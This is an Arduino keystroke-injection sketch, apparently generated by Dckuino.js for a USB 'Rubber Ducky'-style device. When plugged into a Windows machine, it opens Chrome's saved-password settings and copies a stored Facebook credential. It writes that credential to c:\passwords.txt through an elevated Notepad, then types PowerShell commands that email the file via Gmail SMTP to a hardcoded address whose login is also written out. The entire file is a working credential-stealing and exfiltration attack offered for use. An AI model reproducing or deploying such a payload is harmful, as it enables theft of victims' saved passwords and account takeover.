/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("chrome");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(4000);

  Keyboard.print("chrome://settings/");

  typeKey(KEY_RETURN);

  Keyboard.print("password");

  typeKey(KEY_RETURN);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(400);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  Keyboard.print("facebook");

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_DOWN_ARROW);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell start-process notepad.exe -Verb runAs");

  delay(500);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('v');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('f');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("s");

  delay(500);

  Keyboard.print("passwords.txt");

  delay(500);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  Keyboard.print("c");

  delay(1000);

  Keyboard.print("l");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('s');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.EnableSsl = $true");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logdem1234@gmail.com', 'keylogs987654321');");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.From = 'logdem1234@gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.To.Add('logdem1234@gmail.com')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Subject = 'Ducky chrome passwords'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Body = 'Attached is your list of passwords.'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Attachments.Add('c:\\passwords.txt')");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Send($ReportEmail)");

  typeKey(KEY_RETURN);

  delay(3000);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
